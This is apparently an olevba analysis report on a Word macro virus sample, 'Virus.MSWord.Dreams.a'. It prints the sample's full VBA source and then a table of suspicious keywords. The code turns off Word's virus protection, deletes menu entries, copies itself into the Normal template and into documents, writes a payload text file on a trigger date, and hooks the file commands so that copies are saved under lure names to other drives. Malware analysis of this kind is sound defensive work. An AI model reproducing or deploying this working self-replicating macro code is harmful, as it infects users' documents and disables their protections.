olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dreams.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dreams.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Dream.bas 
in file: Virus.MSWord.Dreams.a - OLE stream: 'Macros/VBA/Dream'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Dream.AutoOpen"
  On Error Resume Next
  
  Options.VirusProtection = False
  Application.VBE.ActiveVBProject.VBComponents("Dream").Export "c:\confi~1.~ys"
  
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  
  
  CommandBars("tools").Controls("Macro").Delete
  CommandBars("tools").Controls("Templates and add-ins...").Delete
  ToolsOptionsGeneral.SendMailAttach = 1
  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument
  GlobalInstalled = False
  DocumentInstalled = False
  
  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "Dream" Then
      GlobalInstalled = True
    End If
  Next
  
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Dream" Then
      DocumentInstalled = True
    End If
  Next

   If DocumentInstalled = False And GlobalInstalled = True Then Set Dreamz = ActiveDocument.VBProject
   With Dreamz
With .VBComponents.Import("c:\confi~1.~ys")
End With
End With


If GlobalInstalled = False Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Dream", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

If DocumentInstalled = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
  Reset
  Kill "c:\confi~1.~ys"
  
If (Day(Now)) = 21 Then
   
    Open "C:\Windows\Dreams.txt" For Output As 1
    Print #1, ".-=BadDReAms=-."
    Print #1, "When you sleep"
    Print #1, "Do you see an angel in the dying light"
    Print #1, "Or can you see someone standing outside"
    Print #1, "Trying to set you alight."
    Print #1, "Maybe you`ve seen Someone Somewhere before"
    Print #1, "That I might have loved had I never loved you"
    Print #1, "But you only see Me In bad dreams"
    Close 1
 End If
  

 Application.DisplayAlerts = wdAlertsAll
BadDreams:
End Sub

Sub FileOpen()
Call AutoOpen
With Dialogs(wdDialogFileOpen)
    .Show

End With

End Sub

Sub FileNew()
Call AutoOpen
With Dialogs(wdDialogFileNew)
  .Show
End With

End Sub

Sub FilePrint()
Call AutoOpen
With Dialogs(wdDialogFilePrint)
.Show
End With
End Sub

Sub FileExit()
On Error Resume Next


Call AutoOpen

Randomize
  ze = Int(Rnd * 7) + 1
  If ze = 1 Then zet$ = "hardcore.doc"
  If ze = 3 Then zet$ = "Heroinkills.doc"
  If ze = 2 Then zet$ = "Lesbians.doc"
  If ze = 4 Then zet$ = "Desire.doc"
  If ze = 5 Then zet$ = "Gravitykills.doc"
  If ze = 6 Then zet$ = "R.I.P-TaLoN.doc"
  If ze = 7 Then zet$ = "Hope.doc"
  
If (Day(Now)) >= 15 Then
ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=zet$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    
    ChangeFileOpenDirectory "C:"
    Application.Quit
Else
ChangeFileOpenDirectory "m:"
        ActiveDocument.SaveAs FileName:=zet$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False
ChangeFileOpenDirectory "c:"

Application.Quit
End If
FUCK:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

